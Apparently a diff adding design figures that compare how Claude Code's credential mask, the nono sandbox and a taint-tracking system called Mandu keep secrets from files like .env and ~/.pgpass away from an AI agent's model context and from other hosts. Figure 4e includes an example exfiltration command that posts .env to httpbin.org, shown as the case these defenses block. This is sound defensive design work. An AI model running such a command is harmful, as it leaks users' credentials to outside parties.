+  <text class="s11" x="26" y="36">placeholder / symbol (hatched)</text>
+  <path class="ln-secret" style="marker-end:none" d="M212,32 H228"/>
+  <text class="s11" x="234" y="36">raw bytes, tainted (red)</text>
+  <path class="ln-ok" style="marker-end:none" d="M382,32 H398"/>
+  <text class="s11" x="404" y="36">released / allowed (green)</text>
+  <path class="ln-secret" style="marker-end:none" d="M566,32 H578"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M582,26 V38"/>
+  <text class="s11" x="590" y="36">blocked (red bar)</text>
+  <path class="ln-sep" d="M8,44 H952"/>
+  <path class="bx" d="M16,208 h144 l16,16 v44 h-160 z"/>
+  <path class="ln" d="M160,208 v16 h16"/>
+  <text class="c m" x="96" y="236">~/.pgpass</text>
+  <text class="c s11" x="96" y="250">(readers: [psql])</text>
+  <path class="ln-secret" d="M176,238 H278"/>
+  <text class="c s11" x="228" y="188">raw bytes; open recorded</text>
+  <text class="c s11" x="228" y="202">before the fd is injected</text>
+  <rect class="bx-secret" x="280" y="213" width="170" height="50"/>
+  <text class="c b" x="365" y="228">psql</text>
+  <text class="c s11 secret" x="365" y="242">tainted S2</text>
+  <text class="c s11 muted" x="365" y="256">(pinned path + hash)</text>
+  <path class="ln-secret" style="marker-end:none" d="M450,238 H490"/>
+  <path class="ln-secret" style="marker-end:none" d="M490,80 V390"/>
+  <path class="ln ln-a" d="M490,80 H758"/>
+  <text class="s11" x="498" y="75">rule (i): whole output → <tspan class="m10">$MDU:nomodel_Exec[…]</tspan></text>
+  <text class="s11" x="498" y="93">rule (ii): raw, after the value scan</text>
+  <rect class="bx-ph" x="760" y="63" width="180" height="34"/>
+  <text class="c " x="850" y="78">model context</text>
+  <text class="c s11" x="850" y="90">(the LLM)</text>
+  <path class="ln-ok" d="M490,142 H758"/>
+  <text class="s11" x="498" y="137">connect() allowed: destination check</text>
+  <text class="s11" x="498" y="155">in-kernel, no TLS, no re-signing</text>
+  <rect class="bx-ok" x="760" y="125" width="180" height="34"/>
+  <text class="c " x="850" y="140">bound host</text>
+  <text class="c m" x="850" y="152">db.internal:5432</text>
+  <path class="ln-secret" d="M490,204 H742"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M748,195 V213"/>
+  <text class="s11" x="498" y="199">connect() <tspan class="m">EACCES</tspan>, Inbox row</text>
+  <rect class="bx-secret-o" x="760" y="187" width="180" height="34"/>
+  <text class="c " x="850" y="202">other host</text>
+  <text class="c m" x="850" y="214">httpbin.org</text>
+  <path class="ln-secret" d="M490,266 H758"/>
+  <text class="s11" x="498" y="261">file inherits label S2;</text>
+  <text class="s11" x="498" y="279">its next reader is checked</text>
+  <rect class="bx-secret" x="760" y="249" width="180" height="34"/>
+  <text class="c " x="850" y="264">written file</text>
+  <text class="c m" x="850" y="276">deploy.log</text>
+  <path class="ln-secret" d="M490,328 H758"/>
+  <text class="s11" x="498" y="323">inherits the taint; /proc and ptrace</text>
+  <text class="s11" x="498" y="341">of the tainted pid are refused</text>
+  <rect class="bx-secret" x="760" y="311" width="180" height="34"/>
+  <text class="c " x="850" y="332">child process</text>
+  <path class="ln-ok" d="M490,390 H758"/>
+  <text class="s11" x="498" y="385">real text</text>
+  <rect class="bx-ok" x="760" y="373" width="180" height="34"/>
+  <text class="c " x="850" y="394">human terminal</text>
+  <path class="ln-secret" d="M96,268 V409 H258"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M266,400 V418"/>
+  <text class="c m10" x="180" y="402">open(".pgpass") → EACCES</text>
+  <rect class="bx-secret-o" x="280" y="392" width="170" height="34"/>
+  <text class="c b" x="365" y="406">git</text>
+  <text class="c s11" x="365" y="420">not on the list</text>
+</svg>
+</div>
+<figcaption>Figure 4b. One named program holds the bytes; the label follows every exit it has. Programs not on the list are refused at the open.</figcaption>
+</figure>
+
+<figure>
+<h3>Figure 4c. Claude Code, credentials.files mask</h3>
+<div class="fig2">
+<svg viewBox="0 0 960 452" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4c">
+  <text class="c b s13" x="96" y="18">SOURCE (file)</text>
+  <text class="c b s13" x="365" y="18">PROCESS (the app that reads it)</text>
+  <text class="c b s13" x="850" y="18">SINKS</text>
+  <rect class="bx-ph" x="8" y="27" width="14" height="10"/>
+  <text class="s11" x="26" y="36">placeholder / symbol (hatched)</text>
+  <path class="ln-secret" style="marker-end:none" d="M212,32 H228"/>
+  <text class="s11" x="234" y="36">raw bytes, tainted (red)</text>
+  <path class="ln-ok" style="marker-end:none" d="M382,32 H398"/>
+  <text class="s11" x="404" y="36">released / allowed (green)</text>
+  <path class="ln-secret" style="marker-end:none" d="M566,32 H578"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M582,26 V38"/>
+  <text class="s11" x="590" y="36">blocked (red bar)</text>
+  <path class="ln-sep" d="M8,44 H952"/>
+  <path class="bx" d="M16,208 h144 l16,16 v44 h-160 z"/>
+  <path class="ln" d="M160,208 v16 h16"/>
+  <text class="c m10" x="96" y="233">~/.config/gh/hosts.yml</text>
+  <text class="c s11" x="96" y="247">extract:</text>
+  <text class="c m10" x="96" y="261">'oauth_token: (\S+)'</text>
+  <path class="ln ln-a" d="M176,238 H278"/>
+  <text class="c s11" x="228" y="188">sentinel copy: the extracted span</text>
+  <text class="c s11" x="228" y="202">replaced by a per-session sentinel</text>
+  <rect class="bx" x="280" y="213" width="170" height="50"/>
+  <text class="c s11" x="365" y="235">any sandboxed Bash command</text>
+  <text class="c s11 muted" x="365" y="249">nothing tracked</text>
+  <path class="ln" d="M450,238 H490"/>
+  <path class="ln" d="M490,80 V390"/>
+  <path class="ln ln-a" d="M490,80 H758"/>
+  <text class="s11" x="498" y="75">command output raw;</text>
+  <text class="s11" x="498" y="93">the sentinel is visible</text>
+  <rect class="bx-ph" x="760" y="63" width="180" height="34"/>
+  <text class="c " x="850" y="78">model context</text>
+  <text class="c s11" x="850" y="90">(the LLM)</text>
+  <path class="ln-ok" d="M490,142 H758"/>
+  <text class="s11" x="498" y="137">proxy terminates TLS, swaps sentinel → real</text>
+  <text class="s11" x="498" y="155">value; SigV4 re-signed per protocol</text>
+  <rect class="bx-ok" x="760" y="125" width="180" height="34"/>
+  <text class="c " x="850" y="140">injectHost</text>
+  <text class="c m" x="850" y="152">api.github.com</text>
+  <path class="ln ln-a" d="M490,204 H758"/>
+  <text class="s11" x="498" y="199">sentinel travels as-is (a non-allowed</text>
+  <text class="s11" x="498" y="217">domain is blocked by the allowlist)</text>
+  <rect class="bx-ph" x="760" y="187" width="180" height="34"/>
+  <text class="c " x="850" y="208">other allowed domain</text>
+  <path class="ln ln-a" d="M490,266 H758"/>
+  <text class="s11" x="498" y="261">sentinel written;</text>
+  <text class="s11" x="498" y="279">not tracked</text>
+  <rect class="bx-ph" x="760" y="249" width="180" height="34"/>
+  <text class="c " x="850" y="270">written file</text>
+  <path class="ln ln-a" d="M490,328 H758"/>
+  <text class="s11" x="498" y="323">same sandbox view</text>
+  <rect class="bx-ph" x="760" y="311" width="180" height="34"/>
+  <text class="c " x="850" y="332">child process</text>
+  <path class="ln ln-a" d="M490,390 H758"/>
+  <text class="s11" x="498" y="385">sentinel shown;</text>
+  <text class="s11" x="498" y="403">no reverse mapping</text>
+  <rect class="bx-ph" x="760" y="373" width="180" height="34"/>
+  <text class="c " x="850" y="394">human terminal</text>
+  <path class="ln ln-a" d="M96,268 V409 H278"/>
+  <text class="c s11" x="194" y="388">the mask does not apply;</text>
+  <text class="c s11" x="194" y="402">the permission system decides</text>
+  <rect class="bx" x="280" y="386" width="170" height="46"/>
+  <text class="c s11" x="365" y="406">Claude's own Read tool</text>
+  <text class="c s11 muted" x="365" y="420">outside the sandbox</text>
+  <path class="ln ln-a" d="M450,409 H470 V446 H952 V80 H942"/>
+  <text class="c s11" x="700" y="442">file content as permitted</text>
+</svg>
+</div>
+<figcaption>Figure 4c. The same shape, one process class: every sandboxed command sees the sentinel, nothing is tracked after the read, and the real value appears only inside the TLS-terminating proxy.</figcaption>
+</figure>
+
+<figure>
+<h3>Figure 4d. nono, sensitive paths denied + credential proxy + tool sandbox</h3>
+<div class="fig2">
+<svg viewBox="0 0 960 452" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Figure 4d">
+  <text class="c b s13" x="96" y="18">SOURCE (file / keystore)</text>
+  <text class="c b s13" x="365" y="18">PROCESS (the app that reads it)</text>
+  <text class="c b s13" x="850" y="18">SINKS</text>
+  <rect class="bx-ph" x="8" y="27" width="14" height="10"/>
+  <text class="s11" x="26" y="36">placeholder / symbol (hatched)</text>
+  <path class="ln-secret" style="marker-end:none" d="M212,32 H228"/>
+  <text class="s11" x="234" y="36">raw bytes, tainted (red)</text>
+  <path class="ln-ok" style="marker-end:none" d="M382,32 H398"/>
+  <text class="s11" x="404" y="36">released / allowed (green)</text>
+  <path class="ln-secret" style="marker-end:none" d="M566,32 H578"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M582,26 V38"/>
+  <text class="s11" x="590" y="36">blocked (red bar)</text>
+  <path class="ln-sep" d="M8,44 H952"/>
+  <!-- source 1: the keystore item, resolved outside the box -->
+  <rect class="bx" x="16" y="60" width="160" height="60"/>
+  <text class="c m10" x="96" y="80">op://Dev/Stripe/credential</text>
+  <text class="c s11" x="96" y="95">keystore item, resolved by</text>
+  <text class="c s11" x="96" y="109">the supervisor, never in the box</text>
+  <path class="ln ln-a" d="M176,90 H365 V211"/>
+  <text class="s11" x="186" y="76">phantom token NONO_PROXY_TOKEN in the box;</text>
+  <text class="m10" x="186" y="108">→ http://localhost:PORT/stripe/</text>
+  <!-- source 2: the file on disk -->
+  <path class="bx" d="M16,208 h144 l16,16 v44 h-160 z"/>
+  <path class="ln" d="M160,208 v16 h16"/>
+  <text class="c m10" x="96" y="233">.env   ~/.aws/credentials</text>
+  <text class="c s11" x="96" y="247">not granted by the profile</text>
+  <text class="c s11 muted" x="96" y="261">(sensitive paths, denied by default)</text>
+  <path class="ln-secret" d="M176,238 H262"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M268,229 V247"/>
+  <text class="c s11" x="222" y="188">open() → EACCES, in-kernel</text>
+  <text class="c s11" x="222" y="202">Landlock / Seatbelt; irrevocable</text>
+  <rect class="bx" x="280" y="213" width="170" height="50"/>
+  <text class="c s11" x="365" y="235">any sandboxed command</text>
+  <text class="c s11 muted" x="365" y="249">nothing tracked</text>
+  <text class="c s11 muted" x="365" y="283">env inherited raw unless allow_vars;</text>
+  <text class="c s11 muted" x="365" y="297">env_credentials = the real value in the box</text>
+  <path class="ln" d="M450,238 H490"/>
+  <path class="ln" d="M490,80 V390"/>
+  <path class="ln ln-a" d="M490,80 H758"/>
+  <text class="s11" x="498" y="75">tool result raw; no model-side check;</text>
+  <text class="s11" x="498" y="93">the phantom token is visible</text>
+  <rect class="bx-ph" x="760" y="63" width="180" height="34"/>
+  <text class="c " x="850" y="78">model context</text>
+  <text class="c s11" x="850" y="90">(the LLM)</text>
+  <path class="ln-ok" d="M490,142 H758"/>
+  <text class="s11" x="498" y="137">proxy swaps phantom → real: header, path,</text>
+  <text class="s11" x="498" y="155">query, basic auth; SigV4 re-signed</text>
+  <rect class="bx-ok" x="760" y="125" width="180" height="34"/>
+  <text class="c " x="850" y="140">configured upstream</text>
+  <text class="c m" x="850" y="152">api.stripe.com</text>
+  <path class="ln-secret" d="M490,204 H742"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M748,195 V213"/>
+  <text class="s11" x="498" y="199">not on the allowlist: 403 from the proxy,</text>
+  <text class="s11" x="498" y="217">audited; the phantom is useless anywhere else</text>
+  <rect class="bx-secret-o" x="760" y="187" width="180" height="34"/>
+  <text class="c " x="850" y="202">other host</text>
+  <text class="c m" x="850" y="214">httpbin.org</text>
+  <path class="ln ln-a" d="M490,266 H758"/>
+  <text class="s11" x="498" y="261">phantom written;</text>
+  <text class="s11" x="498" y="279">not tracked</text>
+  <rect class="bx-ph" x="760" y="249" width="180" height="34"/>
+  <text class="c " x="850" y="270">written file</text>
+  <path class="ln ln-a" d="M490,328 H758"/>
+  <text class="s11" x="498" y="323">a policy-controlled tool (git, gh, ssh) gets</text>
+  <text class="s11" x="498" y="341">its own child box and a raw-file / socket cred</text>
+  <rect class="bx-secret-o" x="760" y="311" width="180" height="34"/>
+  <text class="c " x="850" y="325">child tool box</text>
+  <text class="c s11 secret" x="850" y="338">raw bytes, untracked</text>
+  <path class="ln ln-a" d="M490,390 H758"/>
+  <text class="s11" x="498" y="385">raw; nothing to put back;</text>
+  <text class="s11" x="498" y="403">the phantom shown if printed</text>
+  <rect class="bx-ph" x="760" y="373" width="180" height="34"/>
+  <text class="c " x="850" y="394">human terminal</text>
+  <path class="ln-secret" d="M96,268 V409 H262"/>
+  <path class="ln-secret" style="marker-end:none;stroke-width:1.5" d="M268,400 V418"/>
+  <text class="c m10" x="180" y="402">Read(".env") → EACCES</text>
+  <rect class="bx-secret-o" x="280" y="392" width="170" height="34"/>
+  <text class="c s11" x="365" y="406">Claude's own Read tool</text>
+  <text class="c s11 muted" x="365" y="420">inside the box, denied</text>
+  <path class="ln ln-a" d="M450,409 H470 V446 H952 V80 H942"/>
+  <text class="c s11" x="700" y="442">the model gets the denial text and a hook's hint: run nono why</text>
+</svg>
+</div>
+<figcaption>Figure 4d. Two sources, one process class. A key that lives in a keystore never enters the box and is put back by a reverse proxy the program must be pointed at; a file on a sensitive path is unreadable by everything in the box, the model's own Read included. A tool that must hold bytes gets them in a child box, and nothing records what it emits. The model boundary is not a chokepoint: the environment and every command's output reach the model as they are.</figcaption>
+</figure>
+
+<figure>
+<h3>Figure 4e. Seven commands under nono and under Mandu</h3>
+<div class="tw"><table>
+  <thead><tr><th>the agent runs</th><th>nono (<code>nolabs-ai/claude</code> pack, a credential proxy configured)</th><th>Mandu (<code>secrets</code> mode, posture confined)</th></tr></thead>
+  <tbody>
+    <tr><td class="k"><code>Read(".env")</code> <span class="muted">(the model's own read)</span></td><td><code>EACCES</code> inside the box; a hook tells the model to run <code>nono why --path .env</code>. The model never learns the file's shape.</td><td>The structured twin: <code>STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'</code>. Keys visible, every value a symbol.</td></tr>
+    <tr><td class="k"><code>. ./.env &amp;&amp; ./deploy.sh</code> <span class="muted">(curl to api.stripe.com)</span></td><td><code>.env</code> is not granted, so the source fails. The way out is a keystore item and a script that talks to <code>http://localhost:PORT/stripe/</code> with the phantom, or <code>env_credentials</code>, which puts the real value in the box untracked.</td><td>The twin is sourced unchanged; the symbol travels inside the request and the proxy puts the real value back at the bound host (TLS inspected, on by default). Figure 4a.</td></tr>
+    <tr><td class="k"><code>curl -d @.env https://httpbin.org</code></td><td><code>.env</code> is unreadable, and httpbin.org is not on the allowlist: <code>403</code> from the proxy, audited.</td><td>The symbol is withheld; the request is held for the human (Inbox row) or blocked by a standing rule.</td></tr>
+    <tr><td class="k"><code>psql -c 'select count(*) from users'</code> <span class="muted">(~/.pgpass)</span></td><td>Not granted: the login fails. A command policy may hand <code>psql</code> the file as a <code>raw-file</code> credential: raw bytes, output raw to the model, nothing tracked.</td><td><code>psql</code> is a default reader: raw, tainted, <code>connect()</code> only to <code>db.internal:5432</code>; output is <code>$MDU:nomodel_Exec[…]</code> until the user flips psql to rule (ii). Figure 4b.</td></tr>
+    <tr><td class="k"><code>git push</code> <span class="muted">(over SSH)</span></td><td><code>git</code> runs in its child box with <code>can_use: [ssh]</code>; the <code>ssh</code> child receives <code>$SSH_AUTH_SOCK</code> as a local-socket credential only when spawned from git; session-level <code>ssh</code> is denied.</td><td><code>ssh</code> and <code>git</code> are default readers of <code>~/.ssh/id_*</code>: raw, tainted, pinned; <code>connect()</code> only to the bound hosts; output rule (i).</td></tr>
+    <tr><td class="k"><code>aws s3 ls</code> <span class="muted">(~/.aws/credentials)</span></td><td><code>~/.aws</code> is not granted. For a configured upstream (<code>aws_auth</code>) the proxy re-signs SigV4 on the host and the box holds dummy keys.</td><td><code>aws</code> is a default reader; rule (iii) turns every <code>AKIA…</code> span into a symbol and leaves bucket names raw. Figure 3e.</td></tr>
+    <tr><td class="k"><code>printenv</code>, or <code>git remote -v</code> <span class="muted">(a token in the URL)</span></td><td>The environment is inherited raw by default and command output is never inspected: the value reaches the model and the vendor.</td><td>Secret-shaped variables are symbols from launch (<code>$MDU:nomodel_Env[…].GH_TOKEN</code>); the verbatim-value backstop masks a registered value in any exec output.</td></tr>
+  </tbody>
+</table></div>
+<figcaption>Figure 4e. The same seven commands. nono answers "may this box touch it" and is silent once it has; Mandu answers "may this program hold it, and what does what it emits become". Rows 1 and 7 are the model boundary, which only Mandu mediates; rows 4 to 6 are the non-HTTP consumers, where nono gives a child box the bytes and Mandu gives a named reader the bytes plus a label.</figcaption>
+</figure>
+
+<figure>
+<div class="cmp">
+  <h3>Where they differ (Figure 4a–4d)</h3>
+  <div class="tw"><table>
+    <thead><tr><th></th><th>Claude Code mask</th><th>nono</th><th>Mandu plan 10</th></tr></thead>
+    <tbody>
+      <tr><td class="k">unit</td><td>one sandboxed command</td><td>the session box, plus a child box per policy-controlled tool</td><td>one process, per file</td></tr>
+      <tr><td class="k">raw bytes to a program</td><td>never</td><td>a named child tool via <code>raw-file</code> / <code>local-socket</code>; everyone via <code>env_credentials</code> or an inherited variable</td><td>listed readers only</td></tr>
+      <tr><td class="k">tracked after the read</td><td>no</td><td>no (a child's stdout is byte-limited, not labeled)</td><td>yes (taint, four exits)</td></tr>
+      <tr><td class="k">release</td><td>content substitution at a TLS-terminating proxy, per protocol</td><td>phantom → real at a reverse proxy the program is pointed at (<code>localhost:PORT/&lt;service&gt;/</code>, or a session CA): header, path, query, basic auth, SigV4 re-sign</td><td>destination check at connect(); substitution only on the twin path</td></tr>
+      <tr><td class="k">the model's own reads</td><td>outside the sandbox; the permission system decides</td><td>inside the box: <code>EACCES</code>, the file's shape is lost</td><td>the structured twin: keys raw, values symbols</td></tr>
+      <tr><td class="k">the model boundary</td><td>the sentinel is visible; nothing checked</td><td>nothing checked; environment and command output raw</td><td>symbols; a verbatim-value backstop on exec output; the helper model is a vendor too</td></tr>
+      <tr><td class="k">covers</td><td>sandboxed Bash only</td><td>the whole tree, filesystem and network only</td><td>the whole agent tree, the LLM's reads included</td></tr>
+      <tr><td class="k">zero config</td><td>no built-in credential list</td><td>sensitive paths denied by default; a pack per agent; environment inherited raw</td><td>catalog of secret shapes, env-var shapes, a consumer table of default readers</td></tr>
+      <tr><td class="k">learning a reader</td><td>edit the JSON allowlist</td><td><code>nono why</code>, then restart with <code>--allow</code> or edit the profile</td><td>Inbox row on a known consumer's open (allow / once / deny); a standing allow writes the pin to <code>policy.yaml</code></td></tr>
+      <tr><td class="k">host without user namespaces</td><td>bubblewrap required</td><td>none needed (Landlock / Seatbelt)</td><td>the guard alone serves twin / raw / deny by descriptor</td></tr>
+      <tr><td class="k">platforms</td><td>Linux, macOS</td><td>Linux, macOS, WSL2</td><td>Linux confined; macOS read-blocked, not yet run on hardware</td></tr>
+    </tbody>
+  </table></div>
+</div>
+<figcaption>Figure 4. Claude Code's mask is the structured-twin baseline of Figure 1 with release at the wire. nono is the same family for an arbitrary agent, with the key in a keystore, a child box for the tool that must hold bytes, and no chokepoint at the model. Mandu keeps the baseline for every file without a reader list and adds the reader list and the taint for the programs a proxy cannot serve, with the model as one labeled reader among them.</figcaption>
+</figure>
+
+</main>
+</body>
+</html>
